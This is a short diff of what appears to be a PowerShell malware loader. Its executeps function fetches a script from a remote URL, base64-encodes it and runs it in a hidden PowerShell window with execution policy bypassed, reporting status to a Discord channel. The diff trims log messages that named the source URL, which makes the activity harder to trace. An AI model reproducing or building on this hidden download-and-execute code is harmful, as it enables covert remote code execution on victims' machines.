@@ -96,16 +96,12 @@ function Run-Payload {
 function executeps {
     param([string]$Url)
     try {
-        $logMsg = "[*] Downloading script from $Url"
-        Send-DiscordLog $logMsg
         $scriptContent=Invoke-WebRequest -Uri $Url -UseBasicParsing|% Content
-        $logMsg = "[+] Downloaded script from $Url"
-        Send-DiscordLog $logMsg
         $bytes=[System.Text.Encoding]::Unicode.GetBytes($scriptContent)
         $encoded=[Convert]::ToBase64String($bytes)
         $processArgs=@("-WindowStyle","Hidden","-NoProfile","-ExecutionPolicy","Bypass","-EncodedCommand",$encoded)
         Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow -Wait:$false
-        $logMsg = "[+] Launched independent execution from $Url"
+        $logMsg = "[+] Launched ps1 extra script"
         Send-DiscordLog $logMsg
     }
     catch {
